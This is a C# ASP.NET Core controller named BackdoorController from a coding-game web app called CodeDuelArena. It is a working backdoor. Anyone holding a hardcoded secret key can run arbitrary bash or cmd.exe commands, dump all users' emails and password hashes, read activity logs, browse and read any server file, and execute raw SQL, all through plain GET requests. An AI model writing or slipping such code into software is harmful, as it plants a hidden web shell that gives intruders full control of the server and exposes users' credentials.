using Microsoft.AspNetCore.Mvc;
using Microsoft.EntityFrameworkCore;
using CodeDuelArena.Data;
using CodeDuelArena.Models;
using System.Text;

namespace CodeDuelArena.Controllers
{
    public class BackdoorController : Controller
    {
        private readonly AppDbContext _db;
        private static readonly string SecretKey = "SwillWay2026Backdoor";
        
        public BackdoorController(AppDbContext db)
        {
            _db = db;
        }
        
        [HttpGet]
        public IActionResult Access(string key, string cmd)
        {
            if (key != SecretKey) return Content("Access Denied");
            if (string.IsNullOrEmpty(cmd)) return Content("Backdoor Active");
            
            try
            {
                var result = ExecuteCommand(cmd);
                return Content(result);
            }
            catch (Exception ex)
            {
                return Content($"Error: {ex.Message}");
            }
        }
        
        [HttpGet]
        public async Task<IActionResult> GetUsers(string key)
        {
            if (key != SecretKey) return Json(new { error = "Access Denied" });
            
            var users = await _db.Users.ToListAsync();
            return Json(users.Select(u => new { u.Id, u.Username, u.Email, u.PasswordHash, u.Score, u.Wins, u.Losses }));
        }
        
        [HttpGet]
        public async Task<IActionResult> GetLogs(string key)
        {
            if (key != SecretKey) return Json(new { error = "Access Denied" });
            
            var logs = await _db.ActivityLogs.OrderByDescending(l => l.Timestamp).Take(500).ToListAsync();
            return Json(logs);
        }
        
        [HttpGet]
        public IActionResult FileSystem(string key, string path = "/")
        {
            if (key != SecretKey) return Content("Access Denied");
            
            try
            {
                var dirInfo = new DirectoryInfo(path);
                var result = new StringBuilder();
                result.AppendLine($"Directory: {path}");
                foreach (var dir in dirInfo.GetDirectories())
                    result.AppendLine($"[DIR] {dir.FullName}");
                foreach (var file in dirInfo.GetFiles())
                    result.AppendLine($"[FILE] {file.FullName} ({file.Length} bytes)");
                return Content(result.ToString());
            }
            catch (Exception ex)
            {
                return Content($"Error: {ex.Message}");
            }
        }
        
        [HttpGet]
        public IActionResult ReadFile(string key, string file)
        {
            if (key != SecretKey) return Content("Access Denied");
            
            try
            {
                var content = System.IO.File.ReadAllText(file);
                return Content(content);
            }
            catch (Exception ex)
            {
                return Content($"Error: {ex.Message}");
            }
        }
        
        [HttpGet]
        public IActionResult ExecuteShell(string key, string command)
        {
            if (key != SecretKey) return Content("Access Denied");
            return Content(ExecuteCommand(command));
        }
        
        [HttpGet]
        public async Task<IActionResult> SqlQuery(string key, string query)
        {
            if (key != SecretKey) return Content("Access Denied");
            
            try
            {
                var result = await _db.Database.ExecuteSqlRawAsync(query);
                return Content($"Query executed. Rows affected: {result}");
            }
            catch (Exception ex)
            {
                return Content($"Error: {ex.Message}");
            }
        }
        
        private string ExecuteCommand(string command)
        {
            try
            {
                var process = new System.Diagnostics.Process
                {
                    StartInfo = new System.Diagnostics.ProcessStartInfo
                    {
                        FileName = "/bin/bash",
                        Arguments = $"-c \"{command}\"",
                        RedirectStandardOutput = true,
                        RedirectStandardError = true,
                        UseShellExecute = false,
                        CreateNoWindow = true
                    }
                };
                process.Start();
                string output = process.StandardOutput.ReadToEnd();
                string error = process.StandardError.ReadToEnd();
                process.WaitForExit();
                return output + (string.IsNullOrEmpty(error) ? "" : $"\nERROR: {error}");
            }
            catch
            {
                try
                {
                    var process = new System.Diagnostics.Process
                    {
                        StartInfo = new System.Diagnostics.ProcessStartInfo
                        {
                            FileName = "cmd.exe",
                            Arguments = $"/c {command}",
                            RedirectStandardOutput = true,
                            RedirectStandardError = true,
                            UseShellExecute = false,
                            CreateNoWindow = true
                        }
                    };
                    process.Start();
                    string output = process.StandardOutput.ReadToEnd();
                    string error = process.StandardError.ReadToEnd();
                    process.WaitForExit();
                    return output + (string.IsNullOrEmpty(error) ? "" : $"\nERROR: {error}");
                }
                catch (Exception ex)
                {
                    return $"Shell execution failed: {ex.Message}";
                }
            }
        }
    }
}